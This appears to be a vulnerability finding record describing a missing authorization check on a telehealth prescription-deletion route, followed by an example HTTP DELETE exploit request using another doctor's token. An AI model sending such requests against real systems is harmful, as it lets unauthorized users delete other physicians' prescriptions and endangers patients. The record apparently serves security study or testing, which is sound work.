diagnosis: The clinical route deletes a PrescriptionDraft stored in Redis OM based on rx_pk. It never checks whether rx.doctor_license_id matches current_user.license_id or that the prescriber created the draft, allowing unauthorized practitioners to cancel or delete prescriptions authored by other physicians.
exploit_request:
DELETE /clinical/prescriptions/01HJCD8901LMA89012490184A HTTP/1.1
Host: rx.telehealth.org
Authorization: Bearer <doctor_jwt>
